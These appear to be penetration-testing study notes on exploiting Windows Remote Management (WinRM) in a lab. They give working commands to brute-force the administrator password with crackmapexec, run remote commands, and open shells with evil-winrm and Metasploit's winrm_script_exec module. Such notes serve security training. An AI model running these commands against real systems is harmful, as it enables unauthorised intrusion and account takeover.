### Exploiting WinRM
- WinRM(Windwos Remote Management)
- Windows Remote management is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
- Microsoft implementated WinRM in to Windows in order to make life easier for system administrators.
- WinRM is typically used in the following ways
- - Remotely access and interact with Windows hosts on a local network
- - Remotely access and execute commands on Windows systems
- - Manage and configure windows systems remotely
- WinRM typically uses TCP port 5985 and 5986 (HTTPS)
- WinRM implements access control and security for communication between systems through various forms of authentication
- We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target systems
- We can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system.
#### Exploit
- nmap -sV -p- 10.2.18.45 [ scan all the ports to find services for WinRM,WinRM don't explicitly show banners to identify it's services,we can confirm it by it's default port]

#### Crackmapexec
- crackmapexec [ this will show documentatin  for crackmapexec]
- crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [ it will use for winrm brute force,crackmapexec also can be useful winrm,ldap,ssh,mssql,smb,rdp protocols]

- crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami" [ in x paramter value we can execute different commands ]

#### evil-winrm
- evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.45 [this will give us shell]
#### Metasploit
- service postgresql start
- msfconsole
- search winrm_script
- use exploit/windows/winrm/winrm_script_exec
- set everything requires
- this will give us meterpreter shell
